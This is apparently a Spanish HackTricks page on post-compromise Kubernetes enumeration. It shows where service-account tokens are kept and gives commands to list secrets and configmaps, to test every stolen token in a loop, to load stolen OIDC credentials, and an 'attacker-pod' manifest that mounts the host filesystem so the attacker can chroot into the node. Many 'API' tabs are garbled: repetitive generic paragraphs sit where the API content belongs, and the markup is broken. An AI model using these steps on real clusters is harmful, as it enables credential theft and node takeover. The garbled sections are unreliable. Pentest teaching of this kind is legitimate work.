# Enumeración de Kubernetes

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* ¡Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Tokens de Kubernetes

Si has comprometido el acceso a una máquina, es posible que el usuario tenga acceso a alguna plataforma de Kubernetes. El token suele estar ubicado en un archivo señalado por la **variable de entorno `KUBECONFIG`** o **dentro de `~/.kube`**.

En esta carpeta es posible que encuentres archivos de configuración con **tokens y configuraciones para conectarse al servidor de API**. También puedes encontrar una carpeta de caché con información previamente recuperada.

Si has comprometido un pod dentro de un entorno de Kubernetes, hay otros lugares donde puedes encontrar tokens e información sobre el entorno actual de K8:

### Tokens de Cuenta de Servicio

Antes de continuar, si no sabes qué es un servicio en Kubernetes, te sugeriría que **sigas este enlace y leas al menos la información sobre la arquitectura de Kubernetes**.

Tomado de la [documentación](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) de Kubernetes:

_"Cuando creas un pod, si no especificas una cuenta de servicio, se le asigna automáticamente la_ cuenta de servicio predeterminada _en el mismo espacio de nombres."_

**ServiceAccount** es un objeto gestionado por Kubernetes y se utiliza para proporcionar una identidad a los procesos que se ejecutan en un pod.\
Cada cuenta de servicio tiene un secreto relacionado y este secreto contiene un token de portador. Este es un JSON Web Token (JWT), un método para representar reclamaciones de forma segura entre dos partes.

Por lo general, **uno** de los directorios:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

contienen los archivos:

* **ca.crt**: Es el certificado ca para verificar las comunicaciones de Kubernetes
* **namespace**: Indica el espacio de nombres actual
* **token**: Contiene el **token de servicio** del pod actual.

Ahora que tienes el token, puedes encontrar el servidor de API dentro de la variable de entorno **`KUBECONFIG`**. Para obtener más información, ejecuta `(env | set) | grep -i "kuber|kube`**`"`**

El token de la cuenta de servicio está firmado por la clave que reside en el archivo **sa.key** y validado por **sa.pub**.

Ubicación predeterminada en **Kubernetes**:

* /etc/kubernetes/pki

Ubicación predeterminada en **Minikube**:

* /var/lib/localkube/certs

### Pods Calientes

_**Los pods calientes son**_ pods que contienen un token de cuenta de servicio privilegiado. Un token de cuenta de servicio privilegiado es un token que tiene permiso para realizar tareas privilegiadas como listar secretos, crear pods, etc.

## RBAC

Si no sabes qué es **RBAC**, **lee esta sección**.

## Hoja de Trucos de Enumeración

Para enumerar un entorno de K8s necesitas un par de cosas:

* Un **token de autenticación válido**. En la sección anterior vimos dónde buscar un token de usuario y un token de cuenta de servicio.
* La **dirección (**_**https://host:port**_**) del API de Kubernetes**. Esto suele encontrarse en las variables de entorno y/o en el archivo de configuración kube.
* **Opcional**: El **ca.crt para verificar el servidor de API**. Esto se puede encontrar en los mismos lugares donde se puede encontrar el token. Esto es útil para verificar el certificado del servidor de API, pero usando `--insecure-skip-tls-verify` con `kubectl` o `-k` con `curl` no necesitarás esto.

Con esos detalles puedes **enumerar Kubernetes**. Si el **API** por alguna razón es **accesible** a través de **Internet**, simplemente puedes descargar esa información y enumerar la plataforma desde tu host.

Sin embargo, por lo general el **servidor de API está dentro de una red interna**, por lo tanto necesitarás **crear un túnel** a través de la máquina comprometida para acceder desde tu máquina, o puedes **subir el** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binario, o usar **`curl/wget/cualquier cosa`** para realizar solicitudes HTTP crudas al servidor de API.

### Diferencias entre los verbos `list` y `get`

Con los permisos de **`get`** puedes acceder a información de activos específicos (_opción `describe` en `kubectl`_) de la API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Si tienes el permiso **`list`**, se te permite ejecutar solicitudes API para enumerar un tipo de recurso (_opción `get` en `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Si tienes el permiso **`watch`**, estás autorizado para ejecutar solicitudes de API para monitorear activos:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Abren una conexión de transmisión que te devuelve el manifiesto completo de un Despliegue cada vez que cambia (o cuando se crea uno nuevo).

{% hint style="danger" %}
Los siguientes comandos `kubectl` indican cómo listar los objetos. Si deseas acceder a los datos, debes usar `describe` en lugar de `get`.
{% endhint %}

### Usando curl

Desde dentro de un pod, puedes utilizar varias variables de entorno:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Por defecto, el pod puede **acceder** al **servidor kube-api** en el nombre de dominio **`kubernetes.default.svc`** y puedes ver la red kube en **`/etc/resolv.config`** ya que aquí encontrarás la dirección del servidor DNS de kubernetes (el ".1" del mismo rango es el punto final de kube-api).
{% endhint %}

### Usando kubectl

Teniendo el token y la dirección del servidor API, puedes usar kubectl o curl para acceder como se indica aquí:

Por defecto, el APISERVER se comunica con el esquema `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> si no hay `https://` en la URL, es posible que obtengas un Error como Bad Request.

Puedes encontrar una [**hoja de trucos oficial de kubectl aquí**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). El objetivo de las siguientes secciones es presentar de manera ordenada diferentes opciones para enumerar y comprender el nuevo K8s al que has obtenido acceso.

Para encontrar la solicitud HTTP que envía `kubectl`, puedes usar el parámetro `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Configuración Actual

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Si lograste robar algunas credenciales de usuarios, puedes **configurarlas localmente** usando algo como:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Obtener Recursos Soportados

Con esta información sabrás todos los servicios que puedes listar

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Obtener Privilegios Actuales

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

La enumeración de Kubernetes es un proceso crucial durante una evaluación de seguridad. Permite a los pentesters recopilar información valiosa sobre los recursos desplegados en el clúster de Kubernetes, lo que puede ayudar a identificar posibles puntos de entrada para explotar.

#### Pasos para la enumeración de Kubernetes:

1. **Descubrimiento de servicios**: Identificar los servicios expuestos en el clúster de Kubernetes, como API Server, Dashboard, y otros servicios.

2. **Enumeración de recursos**: Enumerar los recursos desplegados, como pods, deployments, services, y otros objetos para comprender la arquitectura del clúster.

3. **Enumeración de roles y permisos**: Identificar roles y permisos asignados a los servicios y usuarios para detectar posibles configuraciones inseguras.

4. **Enumeración de secretos**: Buscar secretos almacenados en el clúster, como tokens de acceso, contraseñas, y certificados, que podrían ser utilizados en ataques.

5. **Enumeración de almacenamiento**: Identificar volúmenes de almacenamiento y configuraciones de almacenamiento para posibles puntos de acceso a datos sensibles.

La enumeración exhaustiva de Kubernetes es esencial para comprender la superficie de ataque y fortalecer la seguridad del clúster. 

{% endtab %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Otra forma de verificar tus privilegios es utilizando la herramienta: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Puedes aprender más sobre **Kubernetes RBAC** en:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Una vez que sepas qué privilegios** tienes, revisa la siguiente página para averiguar **si puedes abusar de ellos** para escalar privilegios:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Obtener otros roles

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

Durante la fase de enumeración, un atacante intentará recopilar la mayor cantidad de información posible sobre el clúster de Kubernetes objetivo. Esto puede incluir:

- Descubrimiento de servicios y pods en el clúster.
- Identificación de roles y permisos asignados a los servicios.
- Enumeración de configuraciones de red y almacenamiento.
- Recopilación de información sobre versiones de software y posibles vulnerabilidades.

Esta información recopilada durante la enumeración será crucial para planificar y llevar a cabo ataques más avanzados contra el clúster de Kubernetes. 

{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Obtener namespaces

Kubernetes admite **múltiples clústeres virtuales** respaldados por el mismo clúster físico. Estos clústeres virtuales se llaman **namespaces**.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

Durante la fase de enumeración, un atacante intentará recopilar la mayor cantidad de información posible sobre el clúster de Kubernetes objetivo. Esto puede incluir la obtención de información sobre los pods, servicios, roles, permisos y configuraciones de red. La enumeración es un paso crucial en el proceso de pentesting, ya que proporciona al atacante una visión general de la superficie de ataque y posibles vectores de ataque.

Algunas técnicas comunes de enumeración en Kubernetes incluyen:

- Enumeración de pods: identificar los pods en ejecución en el clúster.
- Enumeración de servicios: identificar los servicios expuestos en el clúster.
- Enumeración de roles y permisos: identificar los roles y permisos asignados a los usuarios y servicios en el clúster.
- Enumeración de configuraciones de red: identificar la configuración de red del clúster, como políticas de red y reglas de firewall.

La información recopilada durante la enumeración se puede utilizar para identificar posibles vulnerabilidades y puntos débiles en el clúster de Kubernetes, lo que puede ayudar al atacante a planificar y ejecutar ataques de manera más efectiva. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Obtener secretos

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

Durante la fase de enumeración, un atacante intentará recopilar información sobre los recursos de Kubernetes disponibles en el clúster. Esto puede incluir la obtención de información sobre los pods, servicios, volúmenes persistentes, roles y permisos, entre otros. La enumeración es un paso crítico en el proceso de pentesting, ya que proporciona al atacante una visión general de la superficie de ataque y posibles vectores de ataque.

Algunas técnicas comunes de enumeración en Kubernetes incluyen:

- Enumeración de pods: identificar los pods en ejecución en el clúster.
- Enumeración de servicios: identificar los servicios expuestos en el clúster.
- Enumeración de roles y permisos: identificar los roles y permisos asignados a los usuarios y servicios en el clúster.
- Enumeración de volúmenes persistentes: identificar los volúmenes persistentes utilizados en el clúster.

La información recopilada durante la enumeración puede ayudar al atacante a identificar posibles puntos de entrada y a planificar ataques más específicos contra el clúster de Kubernetes. Es importante realizar una enumeración exhaustiva durante una evaluación de seguridad para comprender completamente la superficie de ataque y mitigar posibles riesgos de seguridad. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Si puedes leer secretos, puedes usar las siguientes líneas para obtener los privilegios relacionados con cada token:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Obtener Cuentas de Servicio

Como se discutió al principio de esta página, **cuando se ejecuta un pod, generalmente se le asigna una cuenta de servicio**. Por lo tanto, listar las cuentas de servicio, sus permisos y dónde se están ejecutando puede permitir a un usuario escalar privilegios.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

La enumeración en Kubernetes es un proceso crucial durante una evaluación de seguridad. Aquí hay algunas técnicas comunes para enumerar recursos en un clúster de Kubernetes:

1. **Enumeración de servicios**: Utilice comandos como `kubectl get services` para enumerar los servicios expuestos en el clúster.

2. **Enumeración de pods**: Utilice `kubectl get pods --all-namespaces` para listar todos los pods en el clúster, incluidos los que pueden estar ocultos en otros namespaces.

3. **Enumeración de roles y permisos**: Verifique los roles y permisos asignados a los usuarios y servicios en el clúster utilizando comandos como `kubectl get roles` y `kubectl get rolebindings`.

4. **Enumeración de secretos**: Utilice `kubectl get secrets --all-namespaces` para listar los secretos almacenados en el clúster, lo que puede revelar información confidencial.

5. **Enumeración de almacenamiento persistente**: Verifique los volúmenes de almacenamiento persistente utilizando comandos como `kubectl get pvc` para identificar posibles puntos de acceso para la persistencia de datos.

Al enumerar estos recursos, un pentester puede descubrir posibles puntos débiles en la configuración de seguridad de Kubernetes y ayudar a fortalecerla. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### Obtener Despliegues

Los despliegues especifican los **componentes** que necesitan ser **ejecutados**.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

Durante la fase de enumeración, es crucial recopilar información detallada sobre el clúster de Kubernetes objetivo. Esto puede incluir:

- Versiones de Kubernetes y complementos instalados
- Configuraciones de red y políticas de red
- Roles y permisos de los servicios y cuentas de servicio
- Almacenamiento persistente y configuraciones de almacenamiento
- Configuraciones de seguridad como RBAC y Network Policies

Esta información es fundamental para identificar posibles puntos de entrada y debilidades en el clúster de Kubernetes.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Obtener Pods

Los Pods son los **contenedores** reales que se **ejecutarán**.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

Durante la fase de enumeración, un atacante intentará recopilar la mayor cantidad de información posible sobre el clúster de Kubernetes objetivo. Esto puede incluir la obtención de información sobre los nodos, pods, servicios, roles, permisos y cualquier otra entidad dentro del clúster.

#### Herramientas de Enumeración

Algunas herramientas comunes utilizadas para la enumeración de clústeres de Kubernetes incluyen:

- **kubectl**: La herramienta de línea de comandos oficial para interactuar con clústeres de Kubernetes.
- **kube-hunter**: Una herramienta de código abierto que ayuda a identificar posibles puntos débiles en clústeres de Kubernetes.
- **kubeletctl**: Una herramienta que interactúa con el kubelet API para obtener información sobre los nodos y pods en un clúster de Kubernetes.

#### Métodos de Enumeración

Algunos métodos comunes utilizados para enumerar clústeres de Kubernetes incluyen:

1. **Enumeración de nodos**: Identificar los nodos que forman parte del clúster de Kubernetes.
2. **Enumeración de pods**: Obtener información sobre los pods desplegados en el clúster.
3. **Enumeración de servicios**: Identificar los servicios expuestos dentro del clúster.
4. **Enumeración de roles y permisos**: Identificar los roles y permisos asignados a los usuarios y servicios dentro del clúster.

La enumeración efectiva de un clúster de Kubernetes puede proporcionar a un atacante información valiosa para planificar y ejecutar ataques dirigidos de manera más efectiva. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Obtener Servicios

Los **servicios** de Kubernetes se utilizan para **exponer un servicio en un puerto y IP específicos** (que actuarán como balanceador de carga para los pods que realmente ofrecen el servicio). Es interesante saber dónde se pueden encontrar otros servicios para intentar atacar.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

Durante la fase de enumeración, se pueden utilizar varias técnicas para recopilar información sobre el clúster de Kubernetes objetivo. Algunas de las técnicas comunes incluyen:

- **Descubrimiento de servicios**: Identificar los servicios expuestos en el clúster de Kubernetes, como API Server, Dashboard, etc.
- **Enumeración de pods**: Enumerar los pods desplegados en el clúster para identificar posibles puntos de entrada.
- **Enumeración de roles y permisos**: Identificar los roles y permisos asignados a los servicios y usuarios en el clúster.
- **Enumeración de almacenamiento**: Identificar los volúmenes de almacenamiento y configuraciones relacionadas.
- **Enumeración de secretos**: Identificar los secretos almacenados en el clúster que pueden contener información sensible.

Estas técnicas de enumeración pueden proporcionar información valiosa para llevar a cabo un análisis de seguridad más profundo en el clúster de Kubernetes. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Obtener nodos

Obtener todos los **nodos configurados dentro del clúster**.
```
k get nodes
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

La enumeración de Kubernetes es un proceso crucial durante una evaluación de seguridad. Permite a los pentesters recopilar información sobre los recursos desplegados en el clúster de Kubernetes, como pods, servicios, roles, y más. Esta información es fundamental para identificar posibles puntos de entrada y vulnerabilidades en el clúster.

#### Técnicas de Enumeración

Algunas técnicas comunes de enumeración en Kubernetes incluyen:

- Enumeración de pods: Identificar los pods desplegados en el clúster.
- Enumeración de servicios: Identificar los servicios expuestos en el clúster.
- Enumeración de roles y permisos: Identificar los roles y permisos asignados en el clúster.
- Enumeración de almacenamiento: Identificar los volúmenes de almacenamiento utilizados en el clúster.

Estas técnicas ayudan a los pentesters a comprender la arquitectura del clúster de Kubernetes y a identificar posibles vectores de ataque. Es importante realizar una enumeración exhaustiva para garantizar una evaluación de seguridad completa. 

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Obtener DaemonSets

**DaeamonSets** permite asegurar que un **pod específico se esté ejecutando en todos los nodos** del clúster (o en los seleccionados). Si eliminas el DaemonSet, los pods gestionados por él también serán eliminados.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

La enumeración en Kubernetes es un proceso crucial durante una evaluación de seguridad. Permite a los pentesters recopilar información sobre los recursos desplegados en el clúster, como pods, servicios, roles, y más. Esta información es fundamental para identificar posibles puntos de entrada y vulnerabilidades en el entorno de Kubernetes.

#### Técnicas de Enumeración

Algunas técnicas comunes de enumeración en Kubernetes incluyen:

- Enumeración de pods: Identificar los pods desplegados en el clúster, así como sus imágenes y configuraciones.
- Enumeración de servicios: Identificar los servicios expuestos en el clúster y sus configuraciones.
- Enumeración de roles y permisos: Identificar los roles y permisos asignados a los diferentes servicios y usuarios en el clúster.
- Enumeración de almacenamiento: Identificar los volúmenes de almacenamiento y configuraciones asociadas en el clúster.

Estas técnicas ayudan a los pentesters a comprender mejor la arquitectura y configuración del clúster de Kubernetes, lo que a su vez les permite identificar posibles vectores de ataque y áreas de mejora en la seguridad.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### Obtener cronjob

Los trabajos cron permiten programar, utilizando una sintaxis similar a crontab, el lanzamiento de un pod que realizará alguna acción.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

Durante la fase de enumeración, un atacante intentará recopilar la mayor cantidad de información posible sobre el clúster de Kubernetes objetivo. Esto puede incluir la obtención de información sobre los pods, servicios, roles, permisos y configuraciones de red. La enumeración es un paso crucial en el proceso de pentesting, ya que proporciona al atacante una visión general de la superficie de ataque y posibles vectores de ataque.

#### Herramientas de Enumeración

Algunas herramientas comunes utilizadas para la enumeración de clústeres de Kubernetes incluyen:

- **kubectl**: La herramienta de línea de comandos oficial de Kubernetes que se puede utilizar para interactuar con clústeres de Kubernetes.
- **kube-hunter**: Una herramienta de código abierto que ayuda a identificar posibles puntos débiles en clústeres de Kubernetes.
- **kubeletctl**: Una herramienta que se puede utilizar para interactuar con el kubelet y obtener información sobre los nodos del clúster.

#### Información a Recopilar

Durante la enumeración, un atacante puede intentar recopilar la siguiente información:

- **Información de los pods**: Listar los pods en el clúster y obtener detalles sobre sus imágenes, volúmenes montados y configuraciones.
- **Información de los servicios**: Identificar los servicios expuestos en el clúster y sus configuraciones.
- **Roles y permisos**: Obtener información sobre los roles y permisos asignados en el clúster.
- **Configuraciones de red**: Identificar la configuración de red del clúster, incluidos los servicios expuestos y las políticas de red.

La información recopilada durante la enumeración puede ayudar al atacante a identificar posibles vulnerabilidades y puntos de entrada en el clúster de Kubernetes. Es importante realizar una enumeración exhaustiva para comprender completamente la superficie de ataque y planificar los siguientes pasos del ataque de manera efectiva.

{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Obtener configMap

configMap siempre contiene mucha información y archivos de configuración que proporcionan a las aplicaciones que se ejecutan en el kubernetes. Por lo general, puedes encontrar muchas contraseñas, secretos, tokens que se utilizan para conectarse y validar otros servicios internos/externos.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %} 

### Enumeración de Kubernetes

La enumeración de Kubernetes es un proceso crucial durante una evaluación de seguridad. Permite a los pentesters recopilar información valiosa sobre los recursos, configuraciones y permisos dentro de un clúster de Kubernetes. Algunas técnicas comunes de enumeración incluyen la identificación de servicios expuestos, la enumeración de pods y la búsqueda de credenciales expuestas.

#### Herramientas de Enumeración

Existen varias herramientas que pueden ayudar en el proceso de enumeración de Kubernetes, como `kube-hunter`, `kubesec`, `kubiscan` y `kubi`.

#### Pasos de Enumeración

1. Identificar servicios expuestos: Utilice herramientas como `kube-hunter` para identificar servicios expuestos en el clúster de Kubernetes.
2. Enumerar pods: Utilice comandos como `kubectl get pods --all-namespaces` para enumerar todos los pods en el clúster.
3. Buscar credenciales expuestas: Realice búsquedas en repositorios públicos y en la web para identificar posibles credenciales expuestas involuntariamente.

La enumeración de Kubernetes es un paso fundamental para comprender la superficie de ataque y las posibles vulnerabilidades en un clúster de Kubernetes.

{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Obtener "todo"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Obtener consumos de Pods**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Escapando del pod

Si puedes crear nuevos pods, es posible que puedas escapar de ellos hacia el nodo. Para lograrlo, necesitas crear un nuevo pod utilizando un archivo yaml, cambiar al pod creado y luego hacer chroot en el sistema del nodo. Puedes utilizar pods ya existentes como referencia para el archivo yaml, ya que muestran imágenes y rutas existentes.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> Si necesitas crear un pod en un nodo específico, puedes usar el siguiente comando para obtener las etiquetas del nodo
>
> `k get nodes --show-labels`
>
> Comúnmente, kubernetes.io/hostname y node-role.kubernetes.io/master son buenas etiquetas para seleccionar.
>
> [referencia]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[archivo yaml original](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Después de eso, creas el pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Ahora puedes cambiar al pod creado de la siguiente manera:
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Y finalmente haces chroot en el sistema del nodo
```bash
chroot /root /bin/bash
```
Información obtenida de: [Kubernetes Namespace Breakout usando Volumen de Ruta de Host Insegura - Parte 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Atacando y Defendiendo Kubernetes: Bust-A-Kube - Episodio 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Referencias

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos en** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
